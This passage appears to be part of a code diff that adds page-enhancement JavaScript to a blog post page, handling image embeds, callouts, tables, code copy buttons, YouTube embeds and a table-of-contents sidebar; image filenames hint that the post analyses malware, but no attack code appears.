nativehook-globalscreen.png":"/_astro/jnativehook-globalscreen.CMqCTa4v.png","loadlibrary-call-stack.png":"/_astro/loadlibrary-call-stack.DZUZYJxc.png","luah54-string-references.png":"/_astro/luah54-string-references.BuRPMLzM.png","luah54-virustotal.png":"/_astro/luah54-virustotal.D1WZOXnk.png","malicious-file-artifacts.png":"/_astro/malicious-file-artifacts.BOLmsyMo.png","payload-execution-success.png":"/_astro/payload-execution-success.BGtaZ2Co.png","payload-register-state.png":"/_astro/payload-register-state.CdzXLJ6g.png","pic-shellcode-text-section.png":"/_astro/pic-shellcode-text-section.DaBjwcra.png","procmon-dll-loading.png":"/_astro/procmon-dll-loading.Cu8xfata.png","skidfuscator-ascii-art.png":"/_astro/skidfuscator-ascii-art.Cq9FiBTA.png","skidfuscator-obfuscated-class.png":"/_astro/skidfuscator-obfuscated-class.DbamIPKP.png","sluvimd.png":"/_astro/sluvimD.BLBHNB38.png","sqlite3-virustotal.png":"/_astro/sqlite3-virustotal.QiXrQqf2.png","stager-path-resolution.png":"/_astro/stager-path-resolution.CCe8M2pQ.png","steganography-carrier.png":"/_astro/steganography-carrier.CRwdqBav.png","trailing-null-bytes-removal.png":"/_astro/trailing-null-bytes-removal.ChhUIQwk.png","windbg-loaded-libraries.png":"/_astro/windbg-loaded-libraries.DZW-iomw.png"};
+
+      const WEB_ASSET_MAP = webAssetMap || {};
+
+      const resolveWebAsset = (rawName) => {
+        const key = (rawName || "").trim().toLowerCase();
+        if (!key) return "";
+        if (key.startsWith("http://") || key.startsWith("https://") || key.startsWith("/")) return rawName.trim();
+        return WEB_ASSET_MAP[key] || WEB_ASSET_MAP[key.replace(/^web\//, "")] || "";
+      };
+
+      const enhanceObsidianEmbeds = (root) => {
+        const nodes = Array.from(root.querySelectorAll("p"));
+        nodes.forEach((p) => {
+          if (p.closest(".inline-asset-row")) return;
+          const text = (p.textContent || "").trim();
+          const match = text.match(/^!\[\[(.+?)\]\]$/);
+          if (!match) return;
+
+          const payload = match[1];
+          const parts = payload.split("|");
+          const file = (parts[0] || "").trim();
+          const caption = (parts.slice(1).join("|") || "").trim();
+          const src = resolveWebAsset(file);
+          if (!src) return;
+
+          const figure = document.createElement("figure");
+          figure.className = "obsidian-embed";
+          const img = document.createElement("img");
+          img.src = src;
+          img.alt = caption || file;
+          img.loading = "lazy";
+          figure.appendChild(img);
+
+          if (caption) {
+            const cap = document.createElement("figcaption");
+            cap.textContent = caption;
+            figure.appendChild(cap);
+          }
+
+          p.replaceWith(figure);
+        });
+      };
+
+      const ensureImageModal = () => {
+        let overlay = document.getElementById("image-modal-overlay");
+        if (overlay) return overlay;
+
+        overlay = document.createElement("div");
+        overlay.id = "image-modal-overlay";
+        overlay.className = "image-modal-overlay";
+        overlay.innerHTML = '<div class="image-modal-card"><img class="image-modal-image" alt="Expanded media" /></div>';
+        document.body.appendChild(overlay);
+
+        overlay.addEventListener("click", (event) => {
+          if (event.target === overlay) overlay.classList.remove("open");
+        });
+
+        return overlay;
+      };
+
+      window.openImageModal = (src, alt = "image") => {
+        const overlay = ensureImageModal();
+        const img = overlay.querySelector("img");
+        if (!img) return;
+        img.src = src;
+        img.alt = alt;
+        overlay.classList.add("open");
+      };
+
+      window.copyCode = async (button) => {
+        const row = button.closest(".inline-asset-row");
+        const code = row?.querySelector("pre code")?.textContent ?? "";
+        if (!code) return;
+        try {
+          await navigator.clipboard.writeText(code);
+          const previous = button.textContent;
+          button.textContent = "[ COPIED ]";
+          setTimeout(() => {
+            button.textContent = previous;
+          }, 1200);
+        } catch {
+          button.textContent = "[ FAILED ]";
+        }
+      };
+
+      const getImageFormat = (src) => {
+        const clean = src.split("?")[0].split("#")[0].toLowerCase();
+        const ext = clean.split(".").pop();
+        if (!ext || ext === clean) return "IMG";
+        if (ext === "jpeg") return "JPG";
+        return ext.toUpperCase();
+      };
+
+      const getYouTubeVideoId = (rawUrl) => {
+        try {
+          const url = new URL(rawUrl);
+          const host = url.hostname.replace(/^www\./, "").toLowerCase();
+          if (host === "youtu.be") {
+            return url.pathname.replace(/^\//, "").split("/")[0] || "";
+          }
+          if (host === "youtube.com" || host === "m.youtube.com" || host === "youtube-nocookie.com") {
+            if (url.pathname === "/watch") {
+              return url.searchParams.get("v") || "";
+            }
+            if (url.pathname.startsWith("/embed/")) {
+              return url.pathname.split("/embed/")[1]?.split("/")[0] || "";
+            }
+            if (url.pathname.startsWith("/shorts/")) {
+              return url.pathname.split("/shorts/")[1]?.split("/")[0] || "";
+            }
+          }
+        } catch {
+          return "";
+        }
+        return "";
+      };
+
+      const enhanceMarkdownCallouts = (root) => {
+        const validTypes = ["WARNING", "INFO", "BUG", "NOTE", "TIP"];
+        const iconByType = {
+          WARNING: "⚠",
+          INFO: "ℹ",
+          BUG: "🐞",
+          NOTE: "✎",
+          TIP: "✓",
+        };
+
+        const paragraphs = Array.from(root.querySelectorAll("p"));
+        paragraphs.forEach((p) => {
+          if (p.closest(".md-callout")) return;
+          const first = p.querySelector(":scope > strong");
+          if (!first) return;
+
+          const rawLabel = (first.textContent || "").trim();
+          const upper = rawLabel.toUpperCase();
+          const type = validTypes.find((t) => upper.includes(t));
+          if (!type) return;
+
+          const clone = p.cloneNode(true);
+          const strong = clone.querySelector("strong");
+          if (!strong) return;
+          strong.remove();
+
+          if (clone.firstChild && clone.firstChild.nodeType === Node.TEXT_NODE) {
+            clone.firstChild.textContent = clone.firstChild.textContent.replace(/^[\s\u00a0:：\-]+/, "");
+          }
+
+          const contentHtml = clone.innerHTML.trim();
+          if (!contentHtml) return;
+
+          const box = document.createElement("div");
+          box.className = `md-callout md-callout--${type.toLowerCase()}`;
+          box.innerHTML = `
+            <div class="md-callout__icon" aria-hidden="true">${iconByType[type] || "•"}</div>
+            <div class="md-callout__content"><p>${contentHtml}</p></div>
+          `;
+
+          p.replaceWith(box);
+        });
+      };
+
+      const enhanceMarkdownTables = (root) => {
+        const tables = Array.from(root.querySelectorAll("table"));
+        tables.forEach((table) => {
+          if (table.closest(".table-scroll")) return;
+          const wrapper = document.createElement("div");
+          wrapper.className = "table-scroll";
+          table.parentNode?.insertBefore(wrapper, table);
+          wrapper.appendChild(table);
+        });
+      };
+
+      const wrapWithSidecar = (target, desktopSidecar, mobileBar, rowClass, areaClass) => {
+        if (!target || target.closest(".inline-asset-row")) return null;
+        const row = document.createElement("div");
+        row.className = `inline-asset-row ${rowClass} group`;
+        const content = document.createElement("div");
+        content.className = `asset-content asset-area ${areaClass}`;
+        target.parentNode?.insertBefore(row, target);
+        row.appendChild(desktopSidecar);
+        row.appendChild(mobileBar);
+        row.appendChild(content);
+        content.appendChild(target);
+        return row;
+      };
+
+      const enhanceProseBlocks = (root) => {
+        const images = Array.from(root.querySelectorAll("img"));
+        images.forEach((img) => {
+          if (!img.src || img.closest(".inline-asset-row")) return;
+          const youtubeId = getYouTubeVideoId(img.src);
+          if (youtubeId) {
+            const captionText = (img.alt || "").trim();
+            const showCaption = captionText && captionText.toLowerCase() !== "video";
+
+            const figure = document.createElement("figure");
+            figure.className = "video-embed";
+
+            const frame = document.createElement("div");
+            frame.className = "video-embed__frame";
+            frame.innerHTML = `<iframe src="https://www.youtube.com/embed/${youtubeId}?rel=0" title="YouTube video player" loading="lazy" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>`;
+            figure.appendChild(frame);
+
+            if (showCaption) {
+              const caption = document.createElement("figcaption");
+              caption.textContent = captionText;
+              figure.appendChild(caption);
+            }
+
+            const parent = img.parentElement;
+            if (parent && parent.tagName === "P" && parent.childElementCount === 1 && (parent.textContent || "").trim() === "") {
+              parent.replaceWith(figure);
+            } else {
+              img.replaceWith(figure);
+            }
+            return;
+          }
+
+          const host = img;
+
+          const sidecar = document.createElement("div");
+          sidecar.className = "desktop-sidecar desktop-sidecar--image";
+          sidecar.innerHTML = `
+            <div class="asset-sidecar__label">${getImageFormat(img.src)}</div>
+            <button type="button" class="asset-sidecar__button" title="Open image">[ VIEW ]</button>
+          `;
+          sidecar.querySelector("button")?.addEventListener("click", () => {
+            window.openImageModal(img.src, img.alt || "image");
+          });
+
+          if (!img.dataset.zoomBound) {
+            img.dataset.zoomBound = "true";
+            img.style.cursor = "zoom-in";
+            img.addEventListener("click", (event) => {
+              event.preventDefault();
+              window.openImageModal(img.src, img.alt || "image");
+            });
+          }
+
+          const mobileBar = document.createElement("div");
+          mobileBar.className = "mobile-topbar mobile-topbar--image";
+          mobileBar.innerHTML = `
+            <span>${getImageFormat(img.src)}</span>
+            <span class="mobile-topbar__divider">|</span>
+            <button type="button" class="asset-sidecar__button" title="Open image">[ VIEW ]</button>
+          `;
+          mobileBar.querySelector("button")?.addEventListener("click", () => {
+            window.openImageModal(img.src, img.alt || "image");
+          });
+
+          wrapWithSidecar(host, sidecar, mobileBar, "image-wrapper inline-asset-row--image", "image-area");
+        });
+
+        const codeBlocks = Array.from(root.querySelectorAll("pre"));
+        codeBlocks.forEach((pre) => {
+          if (pre.closest(".inline-asset-row")) return;
+          const code = pre.querySelector("code")?.textContent ?? "";
+          const lines = code ? code.replace(/\n+$/, "").split("\n").length : 0;
+
+          const sidecar = document.createElement("div");
+          sidecar.className = "desktop-sidecar desktop-sidecar--code";
+          sidecar.innerHTML = `
+            <div class="asset-sidecar__label asset-sidecar__meta"><span>CODE</span><span class="asset-sidecar__divider">|</span><span>${lines}</span></div>
+            <button type="button" class="asset-sidecar__button" title="Copy code">[ COPY ]</button>
+          `;
+          sidecar.querySelector("button")?.addEventListener("click", (event) => {
+            window.copyCode(event.currentTarget);
+          });
+
+          const mobileBar = document.createElement("div");
+          mobileBar.className = "mobile-topbar mobile-topbar--code";
+          mobileBar.innerHTML = `
+            <span>CODE</span>
+            <span class="mobile-topbar__divider">|</span>
+            <span class="mobile-topbar__spacer">${lines}</span>
+            <button type="button" class="asset-sidecar__button" title="Copy code">[ COPY ]</button>
+          `;
+          mobileBar.querySelector("button")?.addEventListener("click", (event) => {
+            window.copyCode(event.currentTarget);
+          });
+
+          wrapWithSidecar(pre, sidecar, mobileBar, "code-wrapper inline-asset-row--code", "code-area");
+        });
+      };
+
+      const initPostChrome = () => {
+        const root = document.querySelector(".prose");
+        const tocToggle = document.querySelector(".toc-toggle");
+        const tocOverlay = document.querySelector(".toc-overlay");
+        const tocSidebar = document.querySelector(".toc-sidebar");
+        const tocContent = document.querySelector(".toc-content");
+        const closeBtn = document.querySelector(".close-btn");
+        const themeBtn = document.getElementById("theme-toggle-single");
+        const ruler = document.querySelector(".ruler-scrollbar");
+        const rulerIndicator = document.querySelector(".ruler-indicator");
+        const rulerValue = document.querySelector(".ruler-value");
+
+        if (themeBtn && !themeBtn.dataset.bound) {
+          themeBtn.dataset.bound = "true";
+          themeBtn.addEventListener("click", () => {
+            const isDark = document.documentElement.classList.toggle("dark");
+            localStorage.setItem("theme", isDark ? "dark" : "light");
+          });
+        }
+
+        if (!root || !tocToggle || !tocOverlay || !tocSidebar || !tocContent || !closeBtn) return;
+
+        enhanceObsidianEmbeds(root);
+        enhanceMarkdownCallouts(root);
+        enhanceMarkdownTables(root);
+        enhanceProseBlocks(root);
+
+        const headings = Array.from(root.querySelectorAll("h1, h2, h3, h4, h5, h6"));
+        tocContent.innerHTML = "";
+        let minLevel = 6;
+
+        const items = headings
+          .map((heading, index) => {
+            if (!heading.id) heading.id = `heading-${index}`;
+            const level = Number(heading.tagName.replace("H", ""));
+            if (level < minLevel) minLevel = level;
+            return { id: heading.id, text: heading.textContent?.trim() ?? "", level, heading };
+          })
+          .filter((item) => item.text.length > 0);
+
+        const setOpen = (isOpen) => {
+          tocSidebar.classList.toggle("open", isOpen);
+          tocToggle.classList.toggle("open", isOpen);
+          tocOverlay.style.display = isOpen ? "block" : "none";
+        };
+
+        tocToggle.onclick = () => setOpen(!tocSidebar.classList.contains("open"));
+        closeBtn.onclick = () => setOpen(false);
+        tocOverlay.onclick = () => setOpen(false);
+
+        items.forEach((item) => {
+          const node = document.createElement("div");
+          node.className = "toc-item svelte-1r6e6jk";
+          node.style.paddingLeft = `${(item.level - minLevel) * 1.5 + 1.5}rem`;
+          node.innerHTML = '<div class="toc-item-inner svelte-1r6e6jk"><span class="caret-placeholder svelte-1r6e6jk"></span><span class="toc-text svelte-1r6e6jk"></span></div>';
+          const textNode = node.querySelector(".toc-text");
+          if (textNode) textNode.textContent = item.text;
+          node.addEventListener("click", () => {
+            const top = item.heading.getBoundingClientRect().top + window.scrollY - 80;
+            window.scrollTo({ top, behavior: "smooth" });
+            if (window.innerWidth < 1024) setOpen(false);
+          });
+          tocContent.appendChild(node);
+        });
+
+        const tocNodes = Array.from(tocContent.querySelectorAll(".toc-item"));
+
+        const updateActiveHeading = () => {
+          let activeId = "";
+          for (let i = items.length - 1; i >= 0; i -= 1) {
+            const rect = items[i].heading.getBoundingClientRect();
+            if (rect.top <= 120) {
+              activeId = items[i].id;
+              break;
+            }
+          }
+          if (!activeId && items.length) activeId = items[0].id;
+
+          tocNodes.forEach((node, i) => {
+            node.classList.toggle("active", items[i].id === activeId);
+          });
+        };
+
+        const updateRuler = () => {
+          if (!rulerIndicator || !rulerValue) return;
+          const max = document.documentElement.scrollHeight - window.innerHeight;
+          const progress = max > 0 ? window.scrollY / max : 0;
+          rulerIndicator.style.top = `${Math.max(0, Math.min(100, progress * 100))}%`;
+          rulerValue.textContent = progress.toFixed(2);
+          rulerValue.classList.add("visible");
+          clearTimeout(window.__rulerTimer);
+          window.__rulerTimer = setTimeout(() => rulerValue.classList.remove("visible"), 800);
+        };
+
+        const onScroll = () => {
+          updateActiveHeading();
+          updateRuler();
+        };
+
+        window.addEventListener("scroll", onScroll, { passive: true });
+        window.addEventListener("resize", onScroll);
+
+        if (ruler && !ruler.dataset.bound) {
+          ruler.dataset.bound = "true";
+          ruler.addEventListener("mousedown", (event) => {
+            const rect = ruler.getBoundingClientRect();
+            const ratio = Math.max(0, Math.min(1, (event.clientY - rect.top) / rect.height));
+            const top = ratio * (document.documentElement.scrollHeight - window.innerHeight);
+            window.scrollTo({ top, behavior: "smooth" });
+          });
+        }
+
+        document.querySelector('[data-action="top"]')?.addEventListener("click", () => {
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        });
+        document.querySelector('[data-action="bottom"]')?.addEventListener("click", () => {
+          window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });
+        });
+        document.querySelector('[data-action="expand"]')?.addEventListener("click", () => {
+          setOpen(true);
+        });
+        document.querySelector('[data-action="collapse"]')?.addEventListener("click", () => {
+          setOpen(false);
+        });
+
+        onScroll();
+      };
+
+      initPostChrome();
+      document.addEventListener("astro:page-load", initPostChrome);
+    })();</script> </body> </html>
